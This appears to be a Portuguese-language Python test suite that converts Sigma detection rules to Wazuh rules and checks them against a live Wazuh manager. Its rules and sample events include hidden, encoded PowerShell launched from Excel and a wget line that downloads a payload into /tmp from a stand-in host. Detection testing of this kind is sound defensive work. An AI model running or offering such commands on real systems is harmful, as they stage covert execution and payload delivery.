#!/usr/bin/env python3
"""Sigma convertida rodando em um gerenciador Wazuh real. Requer infra/subir.sh e root.

    /opt/panthera-roar/venv/bin/python testes/fase4/testar_sigma.py [--base PASTA_COM_REGRAS]

Carrega as regras no gerenciador, valida a configuração e confere com a ferramenta de teste
do próprio Wazuh se elas disparam quando devem e calam quando devem.
"""

import json
import sys
import time
from pathlib import Path

import urllib3

RAIZ = Path(__file__).resolve().parents[2]
sys.path[:0] = [str(RAIZ / "ingestao"), str(RAIZ / "testes/fase1")]

from roar_ingestao import provisao  # noqa: E402
from roar_ingestao.sigma import arquivo_de_regras, converter_textos  # noqa: E402
from testar_ingestao import Ambiente, api_do, esperar_gerenciador  # noqa: E402

urllib3.disable_warnings()
RESULTADOS = []

REGRA_POWERSHELL = """
title: PowerShell escondido iniciado pelo Excel
id: 0b4a4a2e-1111-4c1c-9d2e-000000000001
status: test
logsource: {category: process_creation, product: windows}
detection:
  selecao:
    ParentImage|endswith: '\\\\excel.exe'
    Image|endswith: ['\\\\powershell.exe', '\\\\pwsh.exe']
    CommandLine|contains|all: ['-w', 'hidden']
  excecao:
    User: 'AUTORIDADE NT\\\\SISTEMA'
  condition: selecao and not excecao
level: high
tags: [attack.execution, attack.t1059.001]
"""
REGRA_OU = """
title: Conta criada ou apagada
id: 0b4a4a2e-1111-4c1c-9d2e-000000000002
status: test
logsource: {product: windows, service: security}
detection:
  criada: {EventID: 4720}
  apagada: {EventID: 4726}
  condition: criada or apagada
level: medium
"""
REGRA_LINUX = """
title: Download para o tmp seguido de execucao
id: 0b4a4a2e-1111-4c1c-9d2e-000000000003
status: test
logsource: {product: linux, service: syslog}
detection:
  palavras: ['wget -O /tmp/roarcarga']
  condition: palavras
level: high
"""
INCONVERTIVEL = """
title: Compara numero
status: test
logsource: {product: windows, service: security}
detection:
  s: {SubjectLogonId|cidr: '10.0.0.0/8'}
  condition: s
level: low
"""


def registrar(nome, passou, detalhe=""):
    RESULTADOS.append((nome, bool(passou)))
    print(f"[{'PASSOU' if passou else 'FALHOU'}] {nome}" + (f": {detalhe}" if detalhe else ""), flush=True)


def sysmon(imagem, pai, linha, usuario="EMPRESA\\maria"):
    return json.dumps({"win": {
        "system": {"providerName": "Microsoft-Windows-Sysmon", "eventID": "1", "channel": "Microsoft-Windows-Sysmon/Operational",
                   "severityValue": "INFORMATION", "message": "Process Create", "computer": "PC1"},
        "eventdata": {"image": imagem, "parentImage": pai, "commandLine": linha, "user": usuario},
    }})


def seguranca(evento):
    return json.dumps({"win": {
        "system": {"providerName": "Microsoft-Windows-Security-Auditing", "eventID": str(evento), "channel": "Security",
                   "severityValue": "AUDIT_SUCCESS", "message": "Evento", "computer": "PC1"},
        "eventdata": {"targetUserName": "x"},
    }})


def regra_disparada(g, evento, formato="eventchannel", local="EventChannel"):
    r = api_do(g, "PUT", "/logtest", json={"event": evento, "log_format": formato, "location": local})
    saida = r["data"]["output"]
    return saida.get("rule", {}).get("id"), saida.get("rule", {}).get("description"), saida


def main():
    amb = Ambiente()
    try:
        g = amb.gerenciador("sigma")
        registrar("gerenciador no ar", esperar_gerenciador(g))

        amostra = api_do(g, "GET", "/rules", params={"rule_ids": "5712"})["data"]["affected_items"][0]
        print("   formato real da regra:", json.dumps({k: amostra.get(k) for k in ("id", "level", "groups", "mitre", "pci_dss", "gdpr", "hipaa", "nist_800_53", "tsc", "gpg13", "filename", "status")}, ensure_ascii=False)[:600], flush=True)

        print("\n== Regras de exemplo", flush=True)
        exemplos = converter_textos([REGRA_POWERSHELL, REGRA_OU, REGRA_LINUX, INCONVERTIVEL])
        registrar("três regras convertem", all(r.xml for r in exemplos[:3]), str([len(r.xml) for r in exemplos]))
        registrar("o que não dá para expressar é recusado com motivo", not exemplos[3].xml and exemplos[3].motivo, exemplos[3].motivo)

        extras = []
        if "--base" in sys.argv:
            pasta = Path(sys.argv[sys.argv.index("--base") + 1])
            textos = [a.read_text(encoding="utf-8") for a in sorted(pasta.rglob("*.yml"))]
            # Ids depois dos exemplos, para os dois conjuntos conviverem no mesmo arquivo.
            extras = converter_textos(textos, id_inicial=210000)
            aceitas = [r for r in extras if r.xml]
            registrar("base pública convertida", len(aceitas) / max(len(extras), 1) >= 0.8,
                      f"{len(aceitas)} de {len(extras)} regras, {sum(len(r.xml) for r in aceitas)} regras do Wazuh")

        print("\n== Regra ruim não derruba o gerenciador", flush=True)
        ruim = '<group name="sigma,"><rule id="200000" level="5"><field name="x" type="pcre2">(</field><description>r</description></rule></group>\n'
        aceito, detalhe = provisao.aplicar_regras(g["id"], "roar_sigma.xml", ruim)
        registrar("regex inválido é recusado na validação", not aceito, json.dumps(detalhe)[:200])
        registrar("gerenciador segue válido depois da recusa", provisao._configuracao_valida(g["id"])[0])

        xml = arquivo_de_regras(exemplos + extras)
        aceito, detalhe = provisao.aplicar_regras(g["id"], "roar_sigma.xml", xml)
        registrar("configuração válida com as regras", aceito, json.dumps(detalhe)[:400])
        time.sleep(45)
        registrar("gerenciador volta depois de carregar", esperar_gerenciador(g, 240))
        total = api_do(g, "GET", "/rules", params={"group": "sigma", "limit": 1})["data"]["total_affected_items"]
        registrar("regras carregadas de verdade", total >= sum(len(r.xml) for r in exemplos + extras), f"{total} regras")

        print("\n== Dispara quando deve e cala quando deve", flush=True)
        atacante = sysmon("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                          "C:\\Program Files\\Office\\EXCEL.EXE", "powershell -w hidden -enc AAAA")
        rid, descricao, saida = regra_disparada(g, atacante)
        registrar("ataque dispara a regra convertida", descricao == "PowerShell escondido iniciado pelo Excel", f"{rid} {descricao}")
        print("   mitre no alerta:", (saida.get("rule", {}).get("mitre") or {}).get("id"), flush=True)
        _, descricao, _ = regra_disparada(g, sysmon("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                                                    "C:\\Windows\\explorer.exe", "powershell -w hidden"))
        registrar("outro processo pai não dispara", descricao != "PowerShell escondido iniciado pelo Excel", str(descricao))
        _, descricao, _ = regra_disparada(g, sysmon("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                                                    "C:\\Program Files\\Office\\EXCEL.EXE", "powershell -w minimized"))
        registrar("falta de um termo não dispara", descricao != "PowerShell escondido iniciado pelo Excel", str(descricao))
        _, descricao, _ = regra_disparada(g, sysmon("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                                                    "C:\\Program Files\\Office\\EXCEL.EXE", "powershell -w hidden",
                                                    "AUTORIDADE NT\\SISTEMA"))
        registrar("exceção cala a regra", descricao != "PowerShell escondido iniciado pelo Excel", str(descricao))
        _, descricao, _ = regra_disparada(g, sysmon("C:\\Windows\\System32\\WINDOWSPOWERSHELL\\V1.0\\POWERSHELL.EXE",
                                                    "c:\\program files\\office\\excel.exe", "POWERSHELL -W HIDDEN"))
        registrar("não diferencia maiúsculas, como o Sigma", descricao == "PowerShell escondido iniciado pelo Excel", str(descricao))

        for evento in (4720, 4726):
            _, descricao, _ = regra_disparada(g, seguranca(evento))
            registrar(f"evento {evento} dispara o ramo do OU", descricao == "Conta criada ou apagada", str(descricao))
        _, descricao, _ = regra_disparada(g, seguranca(4624))
        registrar("outro evento não dispara", descricao != "Conta criada ou apagada", str(descricao))

        linha = "Nov  1 12:00:00 servidor bash[1]: wget -O /tmp/roarcarga http://exemplo.test/a"
        _, descricao, _ = regra_disparada(g, linha, "syslog", "/var/log/syslog")
        registrar("palavra-chave em log Linux dispara", descricao == "Download para o tmp seguido de execucao", str(descricao))
    finally:
        amb.limpar()

    falhas = [n for n, ok in RESULTADOS if not ok]
    print(f"\n{len(RESULTADOS) - len(falhas)} de {len(RESULTADOS)} passaram.")
    for n in falhas:
        print(f"  falhou: {n}")
    return 1 if falhas else 0


if __name__ == "__main__":
    sys.exit(main())
